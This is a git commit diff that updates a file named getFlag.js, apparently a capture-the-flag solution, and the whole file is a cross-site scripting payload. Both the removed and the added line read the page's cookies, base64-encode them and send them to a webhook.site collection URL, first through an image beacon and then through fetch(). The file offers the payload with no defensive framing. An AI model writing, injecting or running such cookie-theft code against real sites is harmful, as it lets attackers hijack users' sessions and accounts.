45e083ae08600ebb066b31d3d24c1b029cbe5126
leobrada <46957568+leobrada@users.noreply.github.com>
2025-06-05 15:49:50 +0200

    Update getFlag.js

--- getFlag.js
+++ getFlag.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/0d6d8bbb-abc1-4512-bc41-49d5246181c4?
-data='+btoa(document.cookie);
+fetch('https://webhook.site/0d6d8bbb-abc1-4512-bc41-49d5246181c4?data='+btoa(document.cookie));
